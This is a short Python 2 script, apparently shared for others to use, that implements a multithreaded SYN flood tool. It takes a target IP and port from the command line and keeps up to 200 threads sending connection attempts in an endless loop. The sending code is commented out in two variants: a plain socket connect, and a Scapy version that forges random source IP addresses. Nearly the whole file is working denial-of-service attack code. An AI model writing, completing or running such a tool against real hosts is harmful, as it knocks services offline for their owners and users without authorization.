#!/usr/bin/env python
#########################################
# 
# SYNflood.py - A multithreaded SYN Flooder
# By Brandon Smith
# brandon.smith@studiobebop.net
#
# This script is a demonstration of a SYN/ACK 3 Way Handshake Attack 
# as discussed by Halla of Information Leak
#
#########################################
import socket
import random
import sys
import threading
#import scapy # Uncomment this if you're planning to use Scapy

###
# Global Config
###

interface    = None
target       = None
port         = None
thread_limit = 200
total        = 0

#!# End Global Config #!#

class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		# There are two different ways you can go about pulling this off.
		# You can either:
		#   - 1. Just open a socket to your target on any old port
		#   - 2. Or you can be a cool kid and use scapy to make it look cool, and overcomplicated!
		#
		# (Uncomment whichever method you'd like to use)

		# Method 1 -
#		s = socket.socket()
#		s.connect((target,port))

		# Methods 2 -
#		i = scapy.IP()
#		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
#		i.dst = target

#		t = scapy.TCP()
#		t.sport = random.randint(1,65535)
#		t.dport = port
#		t.flags = 'S'

#		scapy.send(i/t, verbose=0)

if __name__ == "__main__":
	# Make sure we have all the arguments we need
	if len(sys.argv) != 4:
		print "Usage: %s <Interface> <Target IP> <Port>" % sys.argv[0]
		exit()

	# Prepare our variables
	interface        = sys.argv[1]
	target           = sys.argv[2]
	port             = int(sys.argv[3])
#	scapy.conf.iface = interface # Uncomment this if you're going to use Scapy

	# Hop to it!
	print "Flooding %s:%i with SYN packets." % (target, port)
	while True:
		if threading.activeCount() < thread_limit: 
			sendSYN().start()
			total += 1
			sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
